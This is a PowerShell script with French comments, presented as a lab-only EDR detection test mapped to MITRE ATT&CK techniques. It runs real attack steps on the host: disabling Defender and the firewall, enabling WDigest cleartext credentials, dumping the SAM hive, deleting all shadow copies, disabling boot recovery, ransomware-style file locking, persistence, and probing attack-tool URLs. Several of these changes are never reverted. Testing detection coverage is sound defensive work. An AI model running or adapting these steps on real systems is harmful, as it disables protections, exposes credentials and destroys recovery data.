# ============================================================
#  EDR TEST SCRIPT - Standalone
#  Pour tester la couverture de detection de ton EDR
#  Usage: powershell -ep bypass -File edr_test.ps1
#  AVERTISSEMENT: Lab isole uniquement - usage autorise seulement
# ============================================================
#  MITRE ATT&CK Coverage:
#  T1003  Credential Access - OS Credential Dumping
#  T1016  Discovery - System Network Configuration
#  T1027  Defense Evasion - Obfuscated Files
#  T1055  Privilege Escalation - Process Injection
#  T1057  Discovery - Process Discovery
#  T1059  Execution - PowerShell
#  T1082  Discovery - System Information
#  T1105  C2 - Ingress Tool Transfer
#  T1486  Impact - Data Encrypted for Impact
#  T1490  Impact - Inhibit System Recovery
#  T1547  Persistence - Boot/Logon Autostart
#  T1555  Credential Access - Browser Credentials
#  T1562  Defense Evasion - Impair Defenses
# ============================================================

$Results = @()
$VictimDir = "$env:USERPROFILE\Documents\EDR_Test_$(Get-Date -Format 'yyyyMMdd_HHmm')"
New-Item -ItemType Directory -Force -Path $VictimDir | Out-Null

function Write-Phase {
    param([string]$ID, [string]$Name)
    Write-Host ""
    Write-Host "===========================================" -ForegroundColor DarkRed
    Write-Host "  [$ID] $Name" -ForegroundColor Red
    Write-Host "===========================================" -ForegroundColor DarkRed
}

function Log-Result {
    param([string]$Technique, [string]$Description, [string]$Status, [string]$Detail="")
    $obj = [PSCustomObject]@{
        Technique   = $Technique
        Description = $Description
        Status      = $Status
        Detail      = $Detail
        Timestamp   = Get-Date -Format "HH:mm:ss"
    }
    $script:Results += $obj
    $color = if ($Status -eq "EXECUTED") { "Yellow" } elseif ($Status -eq "BLOCKED") { "Green" } else { "Red" }
    Write-Host "  [$Status] $Technique - $Description" -ForegroundColor $color
}

# ============================================================
# T1082 - SYSTEM INFORMATION DISCOVERY
# ============================================================
Write-Phase "T1082" "System Information Discovery"

$sysinfo = @{
    Hostname  = $env:COMPUTERNAME
    Username  = $env:USERNAME
    Domain    = (Get-WmiObject Win32_ComputerSystem).Domain
    OS        = (Get-WmiObject Win32_OperatingSystem).Caption
    IP        = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress
    RAM       = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
}
$sysinfo | Format-Table -AutoSize
Log-Result "T1082" "System info enumeration" "EXECUTED" ($sysinfo | Out-String)

# ============================================================
# T1057 - PROCESS DISCOVERY
# ============================================================
Write-Phase "T1057" "Process Discovery"

$procs = Get-Process | Select-Object Name, Id, CPU, WorkingSet | Sort-Object WorkingSet -Descending | Select-Object -First 15
$procs | Format-Table -AutoSize

# Detection EDR processes
$edrProcs = @("MsMpEng","SenseIR","CSFalconService","CSAgent","cb","CarbonBlack",
              "bdagent","bdredline","SentinelAgent","SentinelServiceHost","cyserver")
$detected = $procs | Where-Object { $edrProcs -contains $_.Name }
if ($detected) {
    Write-Host "  [!] EDR Process detected: $($detected.Name)" -ForegroundColor Cyan
    Log-Result "T1057" "Process discovery + EDR fingerprint" "EXECUTED" "EDR found: $($detected.Name)"
} else {
    Log-Result "T1057" "Process discovery" "EXECUTED" "No known EDR process found"
}

# ============================================================
# T1016 - NETWORK CONFIGURATION DISCOVERY
# ============================================================
Write-Phase "T1016" "Network Configuration Discovery"

ipconfig /all | Out-Null
$routes = route print 2>$null
netstat -ano | Select-Object -First 10 | Out-Null
Log-Result "T1016" "ipconfig + route + netstat" "EXECUTED"

# ============================================================
# T1562 - IMPAIR DEFENSES
# ============================================================
Write-Phase "T1562" "Impair Defenses - Disable Windows Defender"

Try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    Log-Result "T1562" "Disable Defender realtime monitoring" "EXECUTED"
} Catch {
    Log-Result "T1562" "Disable Defender realtime monitoring" "BLOCKED" $_.Exception.Message
}

Try {
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop
    Log-Result "T1562" "Disable Defender behavior monitoring" "EXECUTED"
} Catch {
    Log-Result "T1562" "Disable Defender behavior monitoring" "BLOCKED" $_.Exception.Message
}

Try {
    netsh advfirewall set allprofiles state off 2>$null
    Log-Result "T1562" "Disable Windows Firewall" "EXECUTED"
} Catch {
    Log-Result "T1562" "Disable Windows Firewall" "BLOCKED" $_.Exception.Message
}

# ============================================================
# T1003 - CREDENTIAL DUMPING (simulation sans Mimikatz)
# ============================================================
Write-Phase "T1003" "Credential Dumping Simulation"

# Activer WDigest
Try {
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        /v UseLogonCredential /t REG_DWORD /d 1 /f 2>$null | Out-Null
    Log-Result "T1003" "Enable WDigest cleartext caching" "EXECUTED"
} Catch {
    Log-Result "T1003" "Enable WDigest cleartext caching" "BLOCKED" $_.Exception.Message
}

# Tentative dump LSASS (simulation - lecture du process sans injection)
Try {
    $lsass = Get-Process lsass -ErrorAction Stop
    Log-Result "T1003" "LSASS process access (T1003.001)" "EXECUTED" "PID: $($lsass.Id)"
} Catch {
    Log-Result "T1003" "LSASS process access" "BLOCKED" $_.Exception.Message
}

# SAM via reg save
Try {
    reg save HKLM\SAM "$env:TEMP\sam.bak" /y 2>$null | Out-Null
    if (Test-Path "$env:TEMP\sam.bak") {
        Log-Result "T1003" "SAM registry dump" "EXECUTED"
        Remove-Item "$env:TEMP\sam.bak" -Force
    } else {
        Log-Result "T1003" "SAM registry dump" "BLOCKED"
    }
} Catch {
    Log-Result "T1003" "SAM registry dump" "BLOCKED" $_.Exception.Message
}

# ============================================================
# T1555 - BROWSER CREDENTIALS
# ============================================================
Write-Phase "T1555" "Browser Credential Access"

$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$edgePath   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"

if (Test-Path $chromePath) {
    Log-Result "T1555" "Chrome Login Data found" "EXECUTED" $chromePath
} else {
    Log-Result "T1555" "Chrome Login Data" "NOT_FOUND"
}

if (Test-Path $edgePath) {
    Log-Result "T1555" "Edge Login Data found" "EXECUTED" $edgePath
} else {
    Log-Result "T1555" "Edge Login Data" "NOT_FOUND"
}

if (Test-Path $firefoxPath) {
    Log-Result "T1555" "Firefox profiles found" "EXECUTED" $firefoxPath
} else {
    Log-Result "T1555" "Firefox profiles" "NOT_FOUND"
}

# ============================================================
# T1027 - OBFUSCATION / ENCODED COMMAND
# ============================================================
Write-Phase "T1027" "Defense Evasion - Encoded Command"

$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host 'EDR Test T1027 - Encoded payload executed'"))
Try {
    $result = powershell -EncodedCommand $encoded 2>&1
    Log-Result "T1027" "Encoded PowerShell command execution" "EXECUTED" $result
} Catch {
    Log-Result "T1027" "Encoded PowerShell command execution" "BLOCKED" $_.Exception.Message
}

# ============================================================
# T1105 - INGRESS TOOL TRANSFER (simulation)
# ============================================================
Write-Phase "T1105" "Ingress Tool Transfer - Download Simulation"

$testUrls = @(
    "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1",
    "https://github.com/gentilkiwi/mimikatz/releases/latest"
)

foreach ($url in $testUrls) {
    Try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $head = Invoke-WebRequest -Uri $url -Method Head -TimeoutSec 5 -ErrorAction Stop
        Log-Result "T1105" "Download attempt: $(Split-Path $url -Leaf)" "EXECUTED" "HTTP $($head.StatusCode)"
    } Catch {
        Log-Result "T1105" "Download attempt: $(Split-Path $url -Leaf)" "BLOCKED" $_.Exception.Message
    }
}

# ============================================================
# T1490 - INHIBIT SYSTEM RECOVERY
# ============================================================
Write-Phase "T1490" "Inhibit System Recovery"

Try {
    $vss = vssadmin list shadows 2>&1
    if ($vss -match "No items") {
        Log-Result "T1490" "VSS delete shadows (no shadows exist)" "EXECUTED"
    } else {
        vssadmin delete shadows /all /quiet 2>$null | Out-Null
        Log-Result "T1490" "VSS delete shadows" "EXECUTED"
    }
} Catch {
    Log-Result "T1490" "VSS delete shadows" "BLOCKED" $_.Exception.Message
}

Try {
    bcdedit /set {default} recoveryenabled No 2>$null | Out-Null
    Log-Result "T1490" "Disable Windows Recovery (bcdedit)" "EXECUTED"
} Catch {
    Log-Result "T1490" "Disable Windows Recovery" "BLOCKED" $_.Exception.Message
}

# ============================================================
# T1486 - FILE ENCRYPTION SIMULATION
# ============================================================
Write-Phase "T1486" "Data Encrypted for Impact - Simulation"

# Creer fichiers test
$testDir = "$VictimDir\test_files"
New-Item -ItemType Directory -Force -Path $testDir | Out-Null
1..5 | ForEach-Object {
    "Contenu confidentiel fichier $_`nDonnees sensibles..." | Set-Content "$testDir\document_$_.txt"
}

# Chiffrement XOR simule
$key = [byte]0x42
$count = 0
Get-ChildItem $testDir -File | ForEach-Object {
    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
    $enc = $bytes | ForEach-Object { $_ -bxor $key }
    [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $enc)
    Remove-Item $_.FullName -Force
    $count++
}
Log-Result "T1486" "File encryption simulation ($count fichiers)" "EXECUTED" $testDir

# ============================================================
# T1547 - PERSISTENCE
# ============================================================
Write-Phase "T1547" "Persistence - Autostart"

# Registry Run key
Try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "EDR_Test_Persistence" -Value "powershell -w hidden -c Write-Host 'Persistence test'" -ErrorAction Stop
    Log-Result "T1547" "Registry Run key (HKCU)" "EXECUTED"
    # Cleanup
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "EDR_Test_Persistence" -ErrorAction SilentlyContinue
} Catch {
    Log-Result "T1547" "Registry Run key (HKCU)" "BLOCKED" $_.Exception.Message
}

# Scheduled Task
Try {
    schtasks /create /tn "EDR_Test_Task" /tr "powershell -w hidden -c exit" /sc onlogon /f 2>$null | Out-Null
    Log-Result "T1547" "Scheduled Task creation" "EXECUTED"
    schtasks /delete /tn "EDR_Test_Task" /f 2>$null | Out-Null
} Catch {
    Log-Result "T1547" "Scheduled Task creation" "BLOCKED" $_.Exception.Message
}

# ============================================================
# RAPPORT FINAL
# ============================================================
Write-Host ""
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "  EDR TEST RESULTS - RAPPORT FINAL" -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan

$executed  = ($Results | Where-Object { $_.Status -eq "EXECUTED" }).Count
$blocked   = ($Results | Where-Object { $_.Status -eq "BLOCKED" }).Count
$notFound  = ($Results | Where-Object { $_.Status -eq "NOT_FOUND" }).Count
$total     = $Results.Count
$score     = if ($total -gt 0) { [math]::Round(($blocked / $total) * 100, 1) } else { 0 }

Write-Host ""
Write-Host "  Total techniques testees : $total" -ForegroundColor White
Write-Host "  EXECUTED (non detecte)   : $executed" -ForegroundColor Yellow
Write-Host "  BLOCKED  (detecte/bloque): $blocked" -ForegroundColor Green
Write-Host "  NOT FOUND                : $notFound" -ForegroundColor Gray
Write-Host ""
Write-Host "  EDR Coverage Score: $score%" -ForegroundColor $(if ($score -ge 80) { "Green" } elseif ($score -ge 50) { "Yellow" } else { "Red" })
Write-Host ""

$Results | Format-Table Technique, Description, Status, Timestamp -AutoSize

# Export CSV
$csvPath = "$VictimDir\edr_test_results_$(Get-Date -Format 'yyyyMMdd_HHmm').csv"
$Results | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
Write-Host "  Rapport CSV: $csvPath" -ForegroundColor Cyan
Write-Host ""

# Cleanup test files
Remove-Item $testDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "================================================" -ForegroundColor Cyan
